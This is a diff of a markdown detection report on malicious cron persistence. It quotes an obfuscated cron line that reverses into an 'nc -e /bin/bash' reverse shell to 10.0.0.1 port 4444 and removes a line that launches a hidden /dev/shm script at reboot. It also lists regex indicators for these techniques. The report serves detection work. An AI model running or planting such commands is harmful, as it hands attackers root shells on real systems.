@@ -64,14 +64,10 @@ WantedBy=multi-user.target
 
 ```cron
 * * * * * root echo "4444 1.0.0.01 hsab/nib/ e- cn" | rev | bash
-@reboot root echo "/dev/shm/.payload.sh" | at now + 1 minute
 ```
 
 **Matched Indicators (`rules.json`):**
 * `rev\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Reversed command string piped directly into a shell interpreter.*)
-* `\|\s*at\s+(now|[0-9:a-zA-Z+]+)` — **MEDIUM** (*Scheduling one-off tasks via 'at' daemon to break process tree visibility*)
-* `@reboot` — **HIGH** (*Non-standard schedule directive: Executes payload automatically on system startup*)
-* `(/tmp|/dev/shm|/var/tmp|/run/user)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*)
 * `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
 
 **PoC Evidence:**
